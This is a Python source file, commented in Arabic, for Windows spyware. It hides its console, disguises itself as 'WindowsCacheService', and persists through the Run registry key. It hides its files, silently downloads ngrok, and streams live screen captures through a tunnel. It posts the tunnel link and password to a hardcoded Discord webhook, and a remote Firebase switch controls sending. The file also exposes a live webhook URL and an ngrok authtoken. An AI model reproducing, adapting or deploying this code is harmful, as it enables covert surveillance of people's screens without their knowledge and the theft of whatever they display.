# -*- coding: utf-8 -*-
import os
import sys
import io
import time
import ctypes
import struct
import json
import socket
import secrets
import zipfile
import threading
import urllib.request
import subprocess
import winreg
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

DEBUG = ("--debug" in sys.argv) or (os.environ.get("WCDEBUG") == "1")
CREATE_NO_WINDOW = 0x08000000
HIDDEN_ATTR = 0x2 | 0x4

# ====== الإعدادات ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
NGROK_DOWNLOAD_URLS = [
    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
    "https://bin.equinox.io/a/cJk8dzafvmN/ngrok-v3-3.3.1-windows-amd64.zip",
]
FIREBASE_STATUS_URL = (
    "https://firestore.googleapis.com/v1/projects/"
    "database-c7f56/databases/(default)/documents/users/app"
)
MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "WindowsCacheService"
CHECK_INTERVAL = 120
TARGET_NAME = "SK5X08-PC"

# ====== إعدادات البث ======
STREAM_FPS = 12
JPEG_QUALITY = 70
MAX_WIDTH = 1280

# ====== المسارات ======
APPDATA = os.environ.get("APPDATA") or os.path.expanduser("~")
BASE_DIR = os.path.join(APPDATA, "Microsoft", "WindowsCache")
NGROK_EXE = os.path.join(BASE_DIR, "ngrok.exe")
DATA_FILE = os.path.join(BASE_DIR, "data.json")
RUNNING_PATH = os.path.abspath(sys.argv[0])

def log(msg):
    if DEBUG:
        try:
            print(msg)
            sys.stdout.flush()
        except Exception:
            pass

if DEBUG:
    try:
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass
    log("=" * 55)
    log("[*] أداة البث المباشر - وضع التجربة (صفحة دخول + بث سلس)")
    log("=" * 55)

if not DEBUG:
    try:
        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if console_hwnd:
            ctypes.windll.user32.ShowWindow(console_hwnd, 0)
    except Exception:
        pass

try:
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        log("[!] المثيل يعمل مسبقاً - أغلق العملية القديمة أولاً")
        sys.exit(0)
except Exception:
    pass

# ====== أدوات مساعدة ======
def hide_path(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, HIDDEN_ATTR)
    except Exception:
        try:
            subprocess.run(["attrib", "+h", "+s", path],
                           creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def find_pythonw():
    try:
        result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=5, text=True)
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                p = line.strip()
                if os.path.isfile(p):
                    return p
    except Exception:
        pass
    return sys.executable

def load_data():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception:
        pass

def send_discord_message(text):
    try:
        payload = json.dumps({"content": text}).encode("utf-8")
        req = urllib.request.Request(WEBHOOK_URL, data=payload, method="POST",
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status == 200
    except Exception:
        return False

def fetch_firebase_field(field_name, default="on"):
    try:
        req = urllib.request.Request(FIREBASE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode())
            field = data.get("fields", {}).get(field_name, {})
            if "stringValue" in field:
                return field["stringValue"].strip().lower()
            if "booleanValue" in field:
                return "on" if field["booleanValue"] else "off"
            return default
    except Exception:
        return default

def is_this_owner():
    username = os.environ.get("USERNAME", "").strip().upper()
    if username == "HAMDI":
        return True
    me_txt = r"C:\Users\HAMDI\Documents\mybots\apps\me.txt"
    if os.path.exists(me_txt):
        return True
    if socket.gethostname().upper() == TARGET_NAME.upper():
        return True
    return False

def should_send_screenshot():
    if is_this_owner():
        return fetch_firebase_field("owner", "off").lower() == "on"
    return fetch_firebase_field("all", "on").lower() == "on"

# ====== الثبات ======
def ensure_persistence():
    try:
        pythonw = find_pythonw()
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
                          f'"{pythonw}" "{RUNNING_PATH}"')
        winreg.CloseKey(key)
        if not DEBUG:
            hide_path(RUNNING_PATH)
        log("[+] تم التسجيل في Startup")
        return True
    except Exception as e:
        log(f"[!] فشل التسجيل في Startup: {e}")
        return False

# ====== التقاط الشاشة ======
PIL_AVAILABLE = False
def ensure_pil():
    global PIL_AVAILABLE
    log("[*] فحص Pillow...")
    try:
        import PIL
        PIL_AVAILABLE = True
        log("[+] Pillow متوفرة")
        return
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                        "--disable-pip-version-check", "Pillow"],
                       timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import PIL
        PIL_AVAILABLE = True
        log("[+] تم تثبيت Pillow")
    except Exception:
        PIL_AVAILABLE = False
        log("[!] Pillow غير متوفرة - وضع BMP البديل")

FRAME_LOCK = threading.Lock()
CURRENT_FRAME = None
STOP_EVENT = threading.Event()

def grab_bmp():
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(None)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        gdi32.SelectObject(hdc_mem, hbmp)
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
        stride = ((width * 3 + 3) // 4) * 4
        image_size = stride * height
        bmp_header_size = 54
        dib_header_size = 40
        bmp_data = b"BM" + struct.pack("<I", bmp_header_size + dib_header_size + image_size)
        bmp_data += struct.pack("<HH", 0, 0)
        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
        bmp_data += struct.pack("<I", dib_header_size)
        bmp_data += struct.pack("<i", width) + struct.pack("<i", height)
        bmp_data += struct.pack("<HH", 1, 24)
        bmp_data += struct.pack("<I", 0) + struct.pack("<I", image_size)
        bmp_data += struct.pack("<ii", 0, 0) + struct.pack("<II", 0, 0)
        buf = ctypes.create_string_buffer(image_size)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)), 0)
        bmp_data += buf.raw
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)
        return bmp_data
    except Exception:
        return None

def capture_worker():
    global CURRENT_FRAME
    interval = 1.0 / STREAM_FPS
    while not STOP_EVENT.is_set():
        t0 = time.time()
        try:
            if PIL_AVAILABLE:
                from PIL import ImageGrab, Image
                img = ImageGrab.grab()
                w, h = img.size
                if w > MAX_WIDTH:
                    img = img.resize((MAX_WIDTH, int(h * MAX_WIDTH / w)), Image.LANCZOS)
                img = img.convert("RGB")
                buf = io.BytesIO()
                img.save(buf, "JPEG", quality=JPEG_QUALITY)
                data = buf.getvalue()
                with FRAME_LOCK:
                    CURRENT_FRAME = data
        except Exception:
            pass
        elapsed = time.time() - t0
        if elapsed < interval:
            time.sleep(interval - elapsed)

# ====== خادم البث ======
PASSWORD = ""

def build_login_html(err=False):
    hint = '<p style="color:#e06666;margin:0 0 20px">كلمة المرور غير صحيحة</p>' if err else \
           '<p style="color:#eee;font-size:20px;margin:0 0 20px">أدخل كلمة المرور</p>'
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>تسجيل الدخول</title></head>
<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0f1115;font-family:Arial">
<form method="get" action="/" style="background:#1a1d24;padding:40px;border-radius:12px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.4)">
{hint}
<input type="password" name="k" required autofocus style="width:260px;padding:10px;font-size:16px;border-radius:6px;border:1px solid #333;background:#111;color:#fff;text-align:center">
<br><br>
<button type="submit" style="padding:10px 30px;font-size:16px;border:0;border-radius:6px;background:#4a90d9;color:#fff;cursor:pointer">دخول</button>
</form></body></html>"""

def build_html():
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Live View</title></head>
<body style="margin:0;background:#000;overflow:hidden">
<img id="s" style="width:100vw;height:100vh;object-fit:contain">
<script>
var img = document.getElementById('s');
img.src = '/stream?k={PASSWORD}';
</script></body></html>"""

class StreamHandler(BaseHTTPRequestHandler):
    def send_403(self):
        body = "كلمة المرور غير صحيحة"
        self.send_response(403)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            qs = parse_qs(parsed.query)
            key_ok = qs.get("k", [""])[0] == PASSWORD
            path = parsed.path
            if path == "/":
                if not key_ok:
                    # بدون كلمة مرور صحيحة -> صفحة تسجيل دخول (مو 403 فاضية)
                    err = qs.get("err", ["0"])[0] == "1"
                    body = build_login_html(err).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Cache-Control", "no-store")
                    self.end_headers()
                    self.wfile.write(body)
                    return
                body = build_html().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(body)
            elif path == "/stream":
                if not key_ok:
                    log(f"[!] محاولة بث بدون كلمة مرور صحيحة من {self.client_address}")
                    self.send_403()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                try:
                    while True:
                        with FRAME_LOCK:
                            data = CURRENT_FRAME
                        if data:
                            self.wfile.write(b"--frame\r\n")
                            self.wfile.write(b"Content-Type: image/jpeg\r\n")
                            self.wfile.write(("Content-Length: %d\r\n\r\n" % len(data)).encode())
                            self.wfile.write(data)
                            self.wfile.write(b"\r\n")
                            self.wfile.flush()
                        time.sleep(1.0 / STREAM_FPS)
                except Exception:
                    pass
            elif path == "/frame.bmp":
                if not key_ok:
                    self.send_403()
                    return
                data = grab_bmp()
                if not data:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "image/bmp")
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception:
            try:
                self.send_response(500)
                self.end_headers()
            except Exception:
                pass

    def log_message(self, fmt, *args):
        pass

def pick_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port

def start_stream_server():
    port = pick_port()
    server = ThreadingHTTPServer(("127.0.0.1", port), StreamHandler)
    server.daemon_threads = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    log(f"[+] خادم البث يعمل على http://127.0.0.1:{port}")
    return port

# ====== إدارة ngrok ======
def kill_existing_ngrok():
    try:
        subprocess.run(["taskkill", "/IM", "ngrok.exe", "/F"],
                       creationflags=CREATE_NO_WINDOW,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[*] تم إيقاف أي نسخة ngrok قديمة")
        time.sleep(1)
    except Exception:
        pass

def download_ngrok():
    for url in NGROK_DOWNLOAD_URLS:
        log(f"[*] تحميل ngrok... ({url.split('/')[-1]})")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=90) as resp:
                data = resp.read()
            if len(data) < 100000:
                log("[!] الملف صغير جداً - المحاولة التالية")
                continue
            zip_path = os.path.join(BASE_DIR, "ngrok.zip")
            os.makedirs(BASE_DIR, exist_ok=True)
            with open(zip_path, "wb") as f:
                f.write(data)
            with zipfile.ZipFile(zip_path) as z:
                target = None
                for name in z.namelist():
                    if name.lower().endswith("ngrok.exe"):
                        target = name
                        break
                if target:
                    z.extract(target, BASE_DIR)
            hide_path(zip_path)
            if os.path.isfile(NGROK_EXE):
                hide_path(NGROK_EXE)
                log("[+] ngrok جاهز")
                return True
        except Exception as e:
            log(f"[!] فشل التحميل: {e}")
            continue
    return False

def setup_ngrok_auth():
    try:
        subprocess.run([NGROK_EXE, "config", "add-authtoken", NGROK_TOKEN],
                       creationflags=CREATE_NO_WINDOW, timeout=20,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[+] تم تسجيل Authtoken")
    except Exception as e:
        log(f"[!] فشل تسجيل Authtoken: {e}")

def get_tunnel_url():
    try:
        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        for tunnel in data.get("tunnels", []):
            u = tunnel.get("public_url")
            if u:
                return u
    except Exception:
        pass
    return None

STATE = {"proc": None}

def ensure_ngrok(port):
    if not os.path.isfile(NGROK_EXE):
        if not download_ngrok():
            log("[!] تعذر تحميل ngrok")
            return None
        setup_ngrok_auth()

    url = get_tunnel_url()
    if url:
        return url

    proc = STATE.get("proc")
    if proc is not None and proc.poll() is None:
        try:
            proc.kill()
        except Exception:
            pass
        STATE["proc"] = None
        time.sleep(1)

    log("[*] تشغيل نفق ngrok...")
    try:
        env = dict(os.environ)
        env["NGROK_AUTHTOKEN"] = NGROK_TOKEN
        proc = subprocess.Popen(
            [NGROK_EXE, "http", f"http://127.0.0.1:{port}",
             "--log", "stdout", "--log-format", "json"],
            env=env, creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        STATE["proc"] = proc
    except Exception as e:
        log(f"[!] فشل تشغيل ngrok: {e}")
        return None

    for _ in range(40):
        time.sleep(2)
        url = get_tunnel_url()
        if url:
            log(f"[+] النفق جاهز: {url}")
            return url
    log("[!] لم يظهر الرابط بعد - إعادة المحاولة لاحقاً")
    return None

# ====== الحلقة الرئيسية ======
def main_loop(port):
    data = load_data()
    password = data.get("password", "")
    if not password:
        password = secrets.token_urlsafe(8)
        data["password"] = password
        save_data(data)
    last_sent = data.get("last_url", "")
    log(f"[*] كلمة المرور: {password}")
    log("[*] في انتظار تشغيل النفق وإرسال رسالة الديسكورد...")

    while True:
        try:
            if should_send_screenshot():
                url = ensure_ngrok(port)
                if url and url != last_sent:
                    msg = (
                        f"تم كل شيء\n"
                        f"الرابط: {url}/?key={password}\n"
                        f"كلمة المرور: {password}\n"
                        f"ملاحظة: إذا ظهرت صفحة تحذير ngrok اضغط (Visit Site) مرة وحدة"
                    )
                    if send_discord_message(msg):
                        log("[+] تم إرسال الرابط وكلمة المرور للديسكورد")
                        last_sent = url
                        data["last_url"] = url
                        save_data(data)
                    else:
                        log("[!] فشل إرسال رسالة الديسكورد")
            else:
                log("[*] الإرسال معطل من Firebase (owner/all = off)")
        except Exception as e:
            log(f"[!] خطأ في الحلقة: {e}")
        time.sleep(CHECK_INTERVAL)

# ====== البداية ======
def main():
    global PASSWORD
    os.makedirs(BASE_DIR, exist_ok=True)
    hide_path(BASE_DIR)
    ensure_persistence()
    ensure_pil()
    data = load_data()
    PASSWORD = data.get("password", "")
    if not PASSWORD:
        PASSWORD = secrets.token_urlsafe(8)
        data["password"] = PASSWORD
        save_data(data)
    kill_existing_ngrok()
    port = start_stream_server()
    capture_thread = threading.Thread(target=capture_worker, daemon=True)
    capture_thread.start()
    log(f"[+] خيط التقاط الشاشة يعمل ({STREAM_FPS} إطار/ثانية)")
    main_loop(port)

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as e:
        log(f"[!] خطأ غير متوقع: {e}")
        sys.exit(1)
